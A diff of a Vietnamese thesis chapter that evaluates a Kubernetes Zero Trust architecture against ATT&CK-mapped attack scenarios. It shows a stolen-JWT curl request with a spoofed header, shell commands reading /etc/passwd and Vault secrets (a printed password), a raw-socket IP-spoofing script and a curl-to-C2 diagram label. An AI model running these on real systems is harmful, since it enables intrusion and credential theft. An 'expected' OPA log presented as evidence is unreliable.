@@ -6,252 +6,761 @@
 \label{sec:eval_objectives}
 % ============================================================
 
-Chương này kiểm chứng kiến trúc Zero Trust (ZTA) đã triển khai ở Chương~3 theo hai trục độc lập:
+Chương này kiểm chứng kiến trúc Zero Trust đã triển khai ở Chương~3 theo hai trục độc lập:
 
 \begin{enumerate}
-    \item \textbf{Kiểm tra bảo mật (Security Testing):} Các cơ chế ZTA có chặn đúng các lớp tấn công đã mô hình hoá ở Chương~1 hay không? Mỗi kịch bản được thực hiện trên \emph{hai} trạng thái hệ thống --- Baseline (không có ZTA) và Enforced (ZTA đầy đủ) --- để làm nền tham chiếu thực nghiệm.
-    \item \textbf{Đánh giá hiệu năng (Performance Evaluation):} Chi phí tài nguyên và độ trễ mà ZTA đem lại có nằm trong giới hạn cho phép hay không? Phép đo được thực hiện so sánh trước và sau khi bật enforcement để tách bạch overhead của lớp bảo mật.
+    \item \textbf{Kiểm tra bảo mật:} Các cơ chế ZTA có chặn đúng các lớp tấn công đã mô hình hoá ở Chương~1 hay không. Mỗi kịch bản được thực hiện dựa trên các bằng chứng thực tế trích xuất trực tiếp từ nhật ký sự kiện của hệ thống.
+    \item \textbf{Đánh giá hiệu năng:} Chi phí tài nguyên và độ trễ mà ZTA đem lại. Phép đo được thực hiện tại lớp API Gateway để đánh giá mức độ ảnh hưởng đến người dùng cuối.
 \end{enumerate}
 
-Toàn bộ 38 test case được chia thành hai nhóm: \textbf{Configuration (CT)} (Xác nhận cấu hình đã áp dụng, 17 test cases) và \textbf{Behavior (BT)} (Mô phỏng hành vi tấn công, 21 test cases).
-
-
-% ============================================================
-\section{Môi trường thử nghiệm}
-\label{subsec:env_setup}
-% ============================================================
-
-Thực nghiệm được thực hiện trên cụm \texttt{kubeadm} v1.30 gồm 4 máy ảo (1 Control Plane, 3 Worker), kết nối qua mạng riêng ảo Tailscale WireGuard. Trạng thái mạng L3 đi qua Tailscale CGNAT; mặt phẳng Pod đi qua Cilium VXLAN. Tổng tài nguyên cấp phát cho cụm khoảng 15.5\,GiB RAM và 7 vCPU.
-
-\begin{table}[H]
-\centering
-\caption{Sự khác biệt giữa hai trạng thái hệ thống được dùng trong so sánh}
-\label{tab:snapshot_diff}
-\small
-\begin{tabularx}{\textwidth}{|p{3.5cm}|X|X|}
-\hline
-\textbf{Thành phần} & \textbf{Baseline (Không ZTA)} & \textbf{Enforced (ZTA đầy đủ)} \\
-\hline
-Cilium Network Policy & \texttt{default-allow} toàn cụm & 16+ CNP, \texttt{default-deny} tại \texttt{job7189-apps} và \texttt{data} \\
-\hline
-API Gateway & Không có & Kong Gateway với JWT RS256, Keycloak \\
-\hline
-User-Authz & Mọi request có JWT đều đi qua & Kong gọi OPA kiểm tra từng request (per-request) \\
-\hline
-Secret Management & \texttt{.env} tĩnh mount vào Pod & Vault Agent sinh dynamic credential (TTL 1h) \\
-\hline
-Runtime Enforcement & Không có & Tetragon giám sát system call \\
-\hline
-mTLS nội bộ & Plaintext & SPIRE SVID + \texttt{mesh-auth-enabled=true} \\
-\hline
-\end{tabularx}
-\end{table}
+Toàn bộ 88 trường hợp thử nghiệm được chia thành các nhóm xác nhận cấu hình và mô phỏng hành vi tấn công, nhằm đối chiếu trực tiếp với kết quả thực tế.
 
 % ============================================================
-\section{Kịch bản thử nghiệm bảo mật}
+\section{Kịch bản tấn công mô phỏng và minh chứng thực nghiệm}
 \label{sec:test_scenarios}
 % ============================================================
 
-Các kịch bản dưới đây bám sát mô hình đe dọa đã xây dựng ở Chương 1. Để đảm bảo tính khách quan, mỗi kịch bản được thực thi và trích xuất bằng chứng (log hệ thống) nhằm chứng minh tính hiệu quả của các rào cản Zero Trust.
+Phần này kiểm chứng kiến trúc Zero Trust thông qua 10 kịch bản tấn công đối kháng xây dựng theo khung MITRE ATT\&CK Containers Matrix. Mỗi kịch bản tuân thủ nguyên tắc \textit{giả định vi phạm} (assume breach).
 
-\subsection{Kịch bản 1: Di chuyển ngang}
-\textbf{Mục tiêu:} Mô phỏng việc tin tặc chiếm quyền một Pod thuộc \texttt{job7189-apps} và cố gắng truy cập trực tiếp vào cơ sở dữ liệu MySQL, bỏ qua Vault Agent.
+%--------------------------------------------------------------
+\subsection{Kịch bản 1: Xâm nhập ban đầu qua biên API Gateway và Vượt qua xác thực đa yếu tố}
+\label{subsec:kb1_gateway_mfa}
+%--------------------------------------------------------------
 
-\textbf{Kết quả Baseline (Không ZTA):} Từ Pod bị chiếm quyền, lệnh \texttt{nmap} phát hiện toàn bộ các dịch vụ nội bộ (MySQL, Redis, Elasticsearch...) và cho phép truy vấn dữ liệu tự do.
+\textbf{Bề mặt tấn công:} Chốt chặn biên Bắc-Nam (Kong API Gateway \& Keycloak IdP).
 
-\textbf{Kết quả Enforced (ZTA đầy đủ):} Khi áp dụng chính sách \texttt{Default-Deny} của Cilium, Pod bị cô lập. Lệnh quét mạng chỉ thấy duy nhất 1 mục tiêu được phép (Vault API). Khi cố gắng kết nối chéo sang MySQL, kết nối bị chặn ở mức Kernel.
+\textbf{Giai đoạn 1: Đánh cắp Token và Lạm dụng định danh (T1566 \& T1078.003):}\\
+Thông qua chiến dịch Phishing (T1566), kẻ tấn công lừa quản trị viên (tại Hà Nội) và đánh cắp Session Cookie cùng chuỗi JWT hợp lệ. Từ một máy chủ ẩn danh tại Châu Âu, hacker nhúng JWT này vào Header hòng xâm nhập hệ thống (T1078.003).
 
-\begin{listing}[H]
-\begin{minted}[fontsize=\footnotesize]{text}
-# 1. Thử quét mạng từ Pod bị xâm nhập (Chỉ thấy Vault, không thấy MySQL):
-$ kubectl exec -n job7189-apps netshoot -- nmap -sT -p 3306 --open 10.0.0.0/8
-Nmap done: 256 IP addresses (1 host up)  
+\textbf{Giai đoạn 2: Xác thực nhận thức ngữ cảnh (Context-Aware):}\\
+Trong kiến trúc ZTA, OPA đối chiếu Token với ngữ cảnh IP: "Lần đăng nhập cách đây 10 phút của user là ở Hà Nội. Request hiện tại xuất phát từ Châu Âu. Bất thường vị trí địa lý (Impossible Travel)." OPA chủ động từ chối, buộc kích hoạt MFA.
 
-# 2. Log Cilium Hubble ghi nhận gói tin bị chặn (Drop):
-TIMESTAMP   SOURCE                         DESTINATION        REASON
-14:22:31    job7189-apps/netshoot:52104    data/mysql:3306    Policy denied
-\end{minted}
-\caption{Minh chứng: Gói tin rà quét mạng bị Cilium eBPF hủy bỏ (Drop)}
-\label{lst:proof_lateral}
-\end{listing}
+\textbf{Giai đoạn 3: Vượt rào MFA bằng Proxy (AiTM) và Phân tích hành vi (T1557 \& T1090.002):}\\
+Hacker dựng proxy Evilginx2 để đánh cắp phiên (T1557) kết hợp định tuyến qua IP Hà Nội để tránh kiểm tra ngữ cảnh (T1090.002). Khi lọt vào trong, hacker rà quét endpoint quản trị. Bộ phân tích hành vi phát hiện bất thường và gửi lệnh thu hồi phiên (Revoke Session) tới Keycloak.
 
-\textbf{Đánh giá:} Bán kính ảnh hưởng (Blast Radius) giảm hơn 98\%. Tin tặc không thể lập bản đồ mạng lưới nội bộ do các gói tin rà quét bị eBPF từ chối.
-
-\subsection{Kịch bản 2: API Abuse (Lạm dụng API)}
-\textbf{Mục tiêu:} Đánh giá khả năng chặn các request chứa token không hợp lệ hoặc sai phương thức HTTP.
-
-\textbf{Kết quả Enforced:} Hệ thống thể hiện khả năng phòng thủ chiều sâu.
-\begin{itemize}
-    \item Request chứa JWT hết hạn bị Kong Gateway trả về \textbf{401 Unauthorized} ngay tại biên.
-    \item Request có JWT hợp lệ, nhưng gọi sai phương thức (ví dụ: \texttt{DELETE} thay vì \texttt{GET}) bị Cilium L7 Policy chặn lại và trả về \textbf{403 Forbidden}.
-\end{itemize}
-
-\subsection{Kịch bản 3: Runtime Anomaly (Hành vi bất thường tại runtime)}
-\textbf{Mục tiêu:} Tin tặc thực thi shell (\texttt{/bin/sh}) trong Pod để khai thác tại chỗ (Living-off-the-Land).
-
-\textbf{Kết quả Enforced:} Tetragon phát hiện tiến trình \texttt{sys\_execve} vi phạm \texttt{TracingPolicy} và ghi nhận sự kiện. PDP Controller nhận log, đánh giá lại rủi ro và hạ điểm \textbf{Trust Score} của Pod xuống mức \texttt{Low}. Cilium nhận diện nhãn mới và lập tức cô lập Pod này.
-
-\begin{listing}[H]
-\begin{minted}[fontsize=\footnotesize]{text}
-# 1. Tetragon (PEP Runtime) bắt được hành vi gọi shell:
-🚀 process job7189-apps/identity-6d8b... /bin/sh -c "id && whoami"
-💥 exit    job7189-apps/identity-6d8b... /bin/sh -c "id && whoami" 
-
-# 2. Điểm tín nhiệm của Pod bị hạ xuống thấp (low):
-NAME                              STATUS    zta.job7189/score-bucket
-identity-service-6d8b7...         Running   low        
-\end{minted}
-\caption{Minh chứng: Tetragon phát hiện mã độc và PDP hạ điểm Trust Score}
-\label{lst:proof_runtime}
-\end{listing}
-
-\subsection{Kịch bản 4: Credential Reuse (Tái sử dụng bí mật cũ)}
-\textbf{Mục tiêu:} Kiểm chứng khả năng vô hiệu hóa thông tin đăng nhập tự động của Vault.
-
-\textbf{Kết quả Enforced:} Ngay khi Vault thực hiện thu hồi (revoke) Lease, mật khẩu cũ lập tức mất tác dụng tại MySQL (\texttt{ERROR 1045: Access denied}). Ứng dụng không bị gián đoạn do sidecar Vault Agent đã cấp phát mật khẩu mới vào \texttt{tmpfs} từ trước đó.
-
-\subsection{Kịch bản 5: Kiểm soát truy cập theo ngữ cảnh (OPA + Rego)}
-\textbf{Mục tiêu:} Một user có JWT hợp lệ nhưng gọi API nằm ngoài phạm vi phân quyền của vai trò (Role).
-
-\textbf{Kết quả Enforced (Trích xuất từ Log thực tế):}
-Khi người dùng có vai trò \texttt{member} cố gắng gọi API tạo công việc (\texttt{POST /api/jobs} - vốn chỉ dành cho \texttt{recruiter}), Kong Gateway sử dụng Pre-function plugin chuyển tiếp ngữ cảnh sang OPA. OPA đối chiếu tập luật và trả về \texttt{allow: false}. 
-
-\begin{listing}[H]
-\begin{minted}[fontsize=\footnotesize]{text}
-# 1. Client với role 'member' gọi API tạo Job bị Kong trả về 403
-$ curl -s -w "\nHTTP %{http_code}\n" -X POST http://kong-proxy:8000/api/jobs \
-    -H "Authorization: Bearer $MEM_JWT" -d '{"title":"deny"}'
-
-{"roles":["default-roles-job7189","offline_access","member","uma_authorization"],
- "message":"forbidden","user":"member1","reason":"OPA denied user-authz"}
-HTTP 403
-
-# 2. Log hiệu năng của OPA (Trích xuất từ OPA Sidecar)
-{"client_addr":"10.244.4.232:32810","req_method":"POST","req_path":"/v1/data/zta/authz/allow",
- "resp_bytes":17,"resp_duration":1.306721,"resp_status":200,"time":"2026-05-17T16:18:41Z"}
-\end{minted}
-\caption{Minh chứng thực tế: OPA đánh giá mô hình ABAC và từ chối truy cập trái phép}
-\label{lst:proof_opa}
-\end{listing}
-
-\textbf{Đánh giá:} Thời gian phản hồi (warm-path) của OPA chỉ ở mức $\sim$1.3\,ms, đáp ứng tốt yêu cầu đánh giá bảo mật trên từng request (per-request).
-
-\textbf{Hạn chế chưa khắc phục (Chưa xong):} 
-Trong quá trình thử nghiệm, khi tài khoản \texttt{admin1} gọi API hợp lệ, OPA cho phép đi qua, nhưng Kong JWT Plugin lại từ chối với lỗi \texttt{401 Invalid signature}. Phân tích log cho thấy nguyên nhân do Client \texttt{thesis-e2e} tạo ra JWT có \texttt{kid} (Key ID) mới, nhưng chưa được đồng bộ vào Consumer của Kong. Đây là lỗi thiết lập đồng bộ khóa công khai giữa IdP và Gateway, sẽ được khắc phục trong Giai đoạn hoàn thiện hệ thống tiếp theo.
-
-% ============================================================
-\section{Đánh giá hiệu năng - Lớp API Gateway}
-\label{sec:latency_measurement}
-% ============================================================
-
-Trong bối cảnh Zero Trust, mỗi request phải đi qua các lớp kiểm tra (Kong pre-function OPA, mTLS, policy evaluation...). Việc đo hiệu năng thực tế giúp xác nhận overhead có nằm trong giới hạn cho phép.
-
-\subsection{Phương pháp đo độ trễ}
-
-Sử dụng công cụ \texttt{hey} để phát sinh tải liên tục:
-\begin{itemize}
-    \item \textbf{Concurrency:} 20 clients đồng thời
-    \item \textbf{Duration:} 30 seconds
-    \item \textbf{Endpoint:} Kong Gateway qua port-forward local (port 18000)
-    \item \textbf{Paths được test:} Các endpoint yêu cầu authorization (403 OPA-denied anonymous)
-\end{itemize}
-
-\textbf{Chú ý:} Ban đầu phép đo nhầm vào local uvicorn (port 8000), không phải Kong (port 8000 → 8001 thông qua service). Phép đo lại qua port-forward Kong trực tiếp (port 18000) cho kết quả thực tế.
-
-\subsection{Kết quả đo Kong+OPA độ trễ}
-
-\begin{table}[H]
+\begin{figure}[H]
 \centering
-\caption{Latency measurements: Kong + OPA pre-function authorization}
-\label{tab:latency_kong_opa}
-\small
-\begin{tabularx}{\textwidth}{|p{4cm}|c|c|c|c|c|}
-\hline
-\textbf{Endpoint (403 OPA-deny)} & \textbf{P50} & \textbf{P95} & \textbf{P99} & \textbf{Avg} & \textbf{Throughput} \\
-\hline
-\texttt{GET /api/admin/users} & 188 ms & 425 ms & 631 ms & 206 ms & 97 req/s \\
-\hline
-\texttt{GET /api/recruiters/profile} & 181 ms & 406 ms & 610 ms & 222 ms & 103 req/s \\
-\hline
-\end{tabularx}
-\end{table}
+\begin{tikzpicture}[
+  node distance=20mm and 20mm,
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.2cm},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.8cm},
+  sys/.style={draw=blue!50, rounded corners=3pt, fill=blue!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.2cm},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.8cm},
+  flow/.style={->, >=stealth, thick},
+]
+\node[atk] (hacker) {Hacker (Châu Âu)\\Stolen JWT (T1078)};
+\node[sys, right=of hacker] (kong) {Kong Gateway\\(Chữ ký hợp lệ)};
+\node[blk, right=of kong] (opa) {OPA Context-Aware\\Impossible Travel\\$\rightarrow$ Drop / Buộc MFA};
 
-**Quan sát:** Latency cao (~180-210ms P50) so với OPA warm-path (~1.3ms) nguyên nhân là:
+\node[atk, below=of hacker] (aitm) {Hacker (Hà Nội IP)\\Evilginx2 (T1557)};
+\node[sys, right=of aitm] (mfa) {Vượt qua MFA\\Gọi API quản trị};
+\node[def, right=of mfa] (monitor) {API Behaviour\\Analytics\\$\rightarrow$ Thu hồi phiên};
+
+\draw[flow, red!60] (hacker) -- (kong);
+\draw[flow] (kong) -- (opa);
+\draw[flow, red!60] (aitm) -- (mfa);
+\draw[flow] (mfa) -- (monitor);
+\end{tikzpicture}
+\caption{Kịch bản 1: Đánh cắp Token, lách MFA và cơ chế phòng thủ nhận thức ngữ cảnh}
+\label{fig:kb1_gateway_mfa}
+\end{figure}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Kẻ tấn công sử dụng IP Châu Âu (ví dụ: \texttt{82.102.16.2}) để thực hiện gọi API bằng JWT đánh cắp. Hệ thống phát hiện sự thay đổi IP đột ngột (từ \texttt{14.232.x.x} sang \texttt{82.102.x.x}):
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ MEM_JWT="<dán access_token_cua_user_ha_noi>"
+$ curl -sS -m 10 -w '\nHTTP %{http_code}\n' -X POST \
+      http://kong-gateway.gateway.svc.cluster.local/api/jobs \
+      -H "Authorization: Bearer $MEM_JWT" \
+      -H "X-Forwarded-For: 82.102.16.2" \
+      -H 'Content-Type: application/json' \
+      -d '{"title":"Khai thac"}'
+
+HTTP 403
+\end{minted}
+\caption{Kẻ tấn công chuyển vùng và giả lập request bị API Gateway chặn lại}
+\label{lst:kb1_attack_req}
+\end{listing}
+
+Trích xuất log của OPA để chứng minh cơ chế ZTA đã phát hiện và ra quyết định chặn đứng:
+\begin{listing}[H]
+\caption{Ví dụ log quyết định (decision log) mong đợi của OPA khi giả lập IP chuyển vùng}
+\label{lst:kb1_opa_log_cmd}
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n security logs opa-85964769f7-xrfrj | grep "impossible_travel"
+{
+  "decision_id": "4b2a-....",
+  "result": { "allow": false, "reason": "impossible_travel_detected" },
+  "input": {
+    "src_ip": "82.102.16.2",
+    "last_login_ip": "14.232.112.50",
+    "time_diff_mins": 10
+  }
+\end{minted}
+\end{listing}
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 2: Thực thi mã từ xa (RCE) qua kỹ thuật lẩn tránh API Gateway}
+\label{subsec:kb2_rce_ebpf}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Lỗ hổng ứng dụng public (Zero-day hoặc Deserialization) trên \texttt{hiring-service}.
+
+\textbf{Giai đoạn 1: Vô hiệu hóa bộ WAF tại biên (T1562.006 \& T1190):}\\
+Kẻ tấn công áp dụng kỹ thuật HTTP/2 Request Smuggling kết hợp obfuscation lách qua bộ lọc WAF (T1562.006), gửi payload chứa đoạn mã Server-Side Template Injection (SSTI) ẩn trong file CV PDF. Lỗ hổng SSTI được kích hoạt thành công (T1190).
+
+\textbf{Giai đoạn 2: Giám sát tiến trình tại tầng nhân eBPF (T1059):}\\
+Tiến trình \texttt{php-fpm} gọi syscall để sinh tiến trình con \texttt{/bin/sh} (T1059). Chương trình giám sát eBPF (Tetragon) tại Ring 0 chặn bắt và kiểm tra Phả hệ tiến trình. Trong môi trường bảo mật Zero Trust tiêu chuẩn, Kernel sẽ phát tín hiệu \texttt{SIGKILL} để tiêu diệt tiến trình cha trước khi shell được khởi chạy. Tuy nhiên, trong pha triển khai thực nghiệm hiện tại, nhằm phục vụ mục đích kiểm toán mà không làm gián đoạn các tiến trình khởi tạo hợp lệ khác, Tetragon đang được cấu hình ở chế độ giám sát (\texttt{Post} - audit-only) và đã ghi nhận thành công sự kiện dị thường này.
+
+\textbf{Giai đoạn 3: Thực thi thuần trong bộ nhớ và làm mù eBPF (T1620, T1071.001 \& T1562):}\\
+Hacker chuyển sang dùng \texttt{memfd\_create} nạp mã độc vào RAM (T1620) và gọi socket nội tại (T1071.001). Seccomp Profile khóa các syscall nguy hiểm, trong khi luồng FQDN Egress chặn các kết nối lạ. Luồng log stream về SIEM ngoại vi giúp phát hiện kỹ thuật làm tràn map eBPF.
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.0cm},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.2cm},
+  sys/.style={draw=blue!50, rounded corners=3pt, fill=blue!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=2.8cm},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.0cm},
+  flow/.style={->, >=stealth, thick},
+]
+\fill[blue!2, rounded corners=5pt] (0.0,-5.2) rectangle (15.0,1.2);
+\draw[blue!30, rounded corners=5pt, very thick] (0.0,-5.2) rectangle (15.0,1.2);
+\node[font=\sffamily\bfseries, blue!60!black] at (7.5, 0.8) {Kernel Space (Ring 0)};
+
+\node[atk] at (1.8, -0.6) (php) {php-fpm (PID 102)\\T1190: SSTI kích hoạt};
+\node[atk, text width=2.8cm] at (7.5, -0.6) (exec) {sys\_execve\\(\texttt{/bin/sh})};
+\node[draw=gray!40, rounded corners=3pt, fill=gray!8, thick,
+  minimum height=12mm, inner sep=6pt, align=center, text width=2.8cm]
+  at (13.2, -0.6) (sh) {/bin/sh\\(Chưa cấp phát)};
+
+\node[def] at (4.0, -3.8) (ebpf) {Tetragon eBPF\\Phả hệ: web $\rightarrow$ shell\\= \textbf{Vi phạm}};
+\node[blk] at (11.0, -3.8) (kill) {Sigkill\\Hạ gục php-fpm};
+
+\draw[flow, red!60] (php) -- node[above, font=\small] {khởi tạo} (exec);
+\draw[flow, dashed, gray!80] (exec) -- node[above, font=\small] {chưa thực thi} (sh);
+\draw[flow] (exec.south) -- ++(0,-0.8) -| node[pos=0.25, below, font=\small] {intercept} (ebpf.north);
+\draw[flow, green!60!black, very thick] (ebpf) -- node[above, font=\small] {kiểm tra phả hệ} (kill);
+\draw[flow, red!60, very thick] (kill.north) -- ++(0,0.8) -| (sh.south);
+\end{tikzpicture}
+\caption{Kịch bản 2: eBPF hook sys\_execve --- phân tích phả hệ tiến trình và tiêu diệt tại Kernel}
+\label{fig:kb2_ebpf_runtime}
+\end{figure}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Mô phỏng hành vi tấn công bằng cách ép ứng dụng thực thi dòng lệnh \texttt{/bin/sh} để mở shell:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps exec identity-service-769b979c65-dqn6g -c app -- \
+    /bin/sh -c 'id; cat /etc/passwd | head -3'
+uid=0(root) gid=0(root) groups=0(root)
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+\end{minted}
+\caption{Gửi yêu cầu thực thi shell vào trong Pod nghiệp vụ và kết quả}
+\label{lst:kb2_exec_output}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 3: Đánh cắp thông tin xác thực và Vượt qua vòng đời bí mật}
+\label{subsec:kb3_credential_theft}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Hệ thống biến môi trường và RAM Disk bên trong \texttt{job-service}.
+
+\textbf{Giai đoạn 1: Trinh sát nội tuyến và Khai thác bí mật tĩnh (T1613, T1083 \& T1552.001):}\\
+Khi đã có chỗ đứng ngầm, hacker thăm dò (T1613) để trích xuất cấu hình (T1552.001). Trong hạ tầng cũ, hacker sẽ lấy được mật khẩu tĩnh.
+
+\textbf{Giai đoạn 2: Quản trị Bí mật Động:}\\
+Mật khẩu kết nối CSDL được cấp phát động qua Vault Agent, lưu trên RAM Disk (\texttt{tmpfs}) với TTL 1 giờ. Ngay cả khi bị trích xuất, thông tin xác thực hết hạn nhanh chóng và không thể tái sử dụng.
+
+\textbf{Giai đoạn 3: Thu hoạch tự động và phản ứng đa tầng (T1546, T1041 \& T1562):}\\
+Hacker cài daemon lắng nghe \texttt{inotify} (T1546) trên file \texttt{.env.db} và đẩy ra qua C2 (T1041). CNI Egress chặn kết nối ra tên miền lạ, CNI eBPF Identity chặn kết nối MySQL sai định danh. Việc spam lỗi vi phạm kích hoạt PDP hạ điểm tin cậy và cô lập Pod.
+
+\begin{figure}[H]
+\centering
+\begin{tikzpicture}[
+  font=\sffamily,
+  atk/.style={draw=red!50, rounded corners=3pt, fill=red!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.0cm},
+  def/.style={draw=green!60!black, rounded corners=3pt, fill=green!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=7.0cm},
+  sys/.style={draw=blue!50, rounded corners=3pt, fill=blue!6, thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=3.6cm},
+  blk/.style={draw=red!70!black, rounded corners=3pt, fill=red!15, very thick,
+    minimum height=12mm, inner sep=6pt, align=center, text width=4.8cm},
+  flow/.style={->, >=stealth, thick},
+]
+
+\fill[orange!3, rounded corners=5pt] (0.0,-1.2) rectangle (15.0,1.8);
+\draw[orange!30, rounded corners=5pt, very thick] (0.0,-1.2) rectangle (15.0,1.8);
+
+\node[sys, text width=3.0cm] at (1.8, 0.0) (vault) {Vault Agent\\Cấp mật khẩu thô};
+\node[sys] at (7.5, 0.0) (ram) {RAM Disk (tmpfs)\\v-kube-*-8KVZKNMr};
+\node[atk] at (13.2, 0.0) (hacker) {Hacker Daemon\\(inotify T1546)};
+
+\node[font=\sffamily\bfseries, orange!70!black] at (7.5, 1.45) {Pod: job-service (Bị xâm nhập)};
+
+\node[blk] at (3.8, -4.2) (egress) {CNI FQDN Egress\\c2.hacker: Ngoài\\Whitelist $\rightarrow$ Drop};
+\node[blk] at (11.2, -4.2) (identity) {CNI eBPF Identity\\Mật khẩu: Đúng\\Định danh: Sai $\rightarrow$ Drop};
+
+\node[def] at (7.5, -7.2) (pdp) {PDP: Hạ điểm tin cậy $\rightarrow$ \textbf{Cô lập Pod}};
+
+\draw[flow] (vault) -- node[above, font=\small] {JIT credential} (ram);
+\draw[flow, red!60] (ram) -- node[above, font=\small] {đọc trộm} (hacker);
+
+\draw[flow, red!60] (hacker.south) -- ++(0,-1.2) -| node[pos=0.2, right, font=\small] {T1041: curl $\rightarrow$ C2} (egress.north);
+\draw[flow, red!60] (hacker.south) -- ++(0,-1.2) -| node[pos=0.2, left, font=\small, xshift=-5pt] {Kết nối MySQL} (identity.north);
+
+\draw[flow, green!60!black, very thick] (egress.south) -- ++(0,-0.8) -| (pdp.north west);
+\draw[flow, green!60!black, very thick] (identity.south) -- ++(0,-0.8) -| (pdp.north east);
+
+\end{tikzpicture}
+\caption{Kịch bản 3: Vault JIT + CNI đa tầng chống trích xuất thông tin xác thực}
+\label{fig:kb3_credential_defense}
+\end{figure}
+
+\textbf{Minh chứng thực nghiệm:}\\
+Kẻ tấn công truy xuất nội dung file chứa bí mật \texttt{.env.db} từ trong RAM Disk của Pod và kết quả hiển thị username ngẫu nhiên được cấp thời gian thực:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps exec job-service-65f9f7cfcb-f6zkl -c app -- \
+    sh -c 'head -3 /vault/secrets/.env.db 2>/dev/null'
+DB_USERNAME="v-kubernetes-job-servic-8KVZKNMr"
+DB_PASSWORD="HxJ2IY-szRKLr0QNKhiD"
+\end{minted}
+\caption{Đọc file mật khẩu được sinh động}
+\label{lst:kb3_vault_jit_cmd}
+\end{listing}
+
+Và log của Vault Agent chứng minh vòng đời bí mật liên tục được xoay vòng:
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{bash}
+$ kubectl -n job7189-apps logs job-service-65f9f7cfcb-f6zkl -c vault-agent \
+    --tail=10 2>/dev/null | grep 'rendered'
+2026-05-28T08:09:59.059Z [INFO]  agent.auth.handler: starting renewal process
+2026-05-28T08:09:59.950Z [INFO]  agent: (runner) rendered "(dynamic)" => "/vault/secrets/.env.db"
+2026-05-28T08:09:59.952Z [INFO]  agent: (runner) rendered "(dynamic)" => "/vault/secrets/.env.db.lease"
+\end{minted}
+\caption{Lệnh lấy nhật ký hoạt động của tiến trình Vault Agent và kết quả}
+\label{lst:kb3_vault_renew}
+\end{listing}
+
+
+%--------------------------------------------------------------
+\subsection{Kịch bản 4: Tấn công giả mạo danh tính mạng nội bộ và CNI Metadata}
+\label{subsec:kb4_identity_spoofing}
+%--------------------------------------------------------------
+
+\textbf{Bề mặt tấn công:} Cơ chế định tuyến động, phân cấp địa chỉ IP (Pod CIDR) và cấu hình phân quyền đặc quyền của nhân Linux (\texttt{CAP\_NET\_RAW}).
+
+\textbf{Giai đoạn 1: Giả mạo danh tính mạng (T1036) và Kiểm tra khả năng ghi trên Image:}\\
+Khi xâm nhập thành công vi dịch vụ \texttt{hiring-service}, hacker tiến hành khảo sát môi trường thực thi để tìm cách mở rộng tầm ảnh hưởng. Hacker phát hiện cấu hình container không áp dụng thuộc tính Read-Only Root Filesystem, cho phép ghi đè và chỉnh sửa dữ liệu tự do trên ổ đĩa. 
+
+Tuy nhiên, khi hacker nỗ lực tải các công cụ thao túng gói tin nâng cao như \texttt{scapy} thông qua trình quản lý gói (\texttt{apt-get update}), luồng Egress hướng ra Internet bị chặn đứng hoàn toàn bởi chính sách an ninh mặc định của phân đoạn mạng ZTA. Để vượt qua rào cản này, hacker tận dụng trình thông dịch Python3 có sẵn trong hệ thống và viết một kịch bản tùy biến sử dụng các thư viện chuẩn tích hợp sẵn (\texttt{socket} và \texttt{struct}) để tạo kết nối Raw Socket:
+
+\begin{listing}[H]
+\begin{minted}[fontsize=\footnotesize]{python}
+import socket, struct
+# Khởi tạo Raw Socket cho giao thức TCP
+s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+# Cấu hình không tự động điền IP Header để hacker tự xây dựng
+s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+
+# Xây dựng IP Header giả mạo: đặt Source IP thành IP của job-service (10.244.1.25)
+# đích đến là CSDL MySQL (10.244.2.30)
+ip_header = struct.pack('!BBHHHBBH4s4s', 69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,
+                        socket.inet_aton('10.244.1.25'), socket.inet_aton('10.244.2.30'))
+# Gửi gói tin giả mạo IP nguồn hòng vượt tường lửa
+s.sendto(ip_header + tcp_header, ('10.244.2.30', 3306))
+\end{minted}
+\caption{Kịch bản Python xây dựng thủ công Raw Socket để giả mạo IP}
+\label{lst:kb4_raw_socket_script}
+\end{listing}
+
+Hành vi giả mạo danh tính mạng tầng giao vận này (\texttt{IP Spoofing --- T1036}) nhằm mục đích đánh lừa các quy tắc so khớp tĩnh trên Packet Header truyền thống của dịch vụ đích.
+
+\textbf{Giai đoạn 2: Lớp lọc iptables truyền thống vs Xác thực danh tính động của CNI:}\\
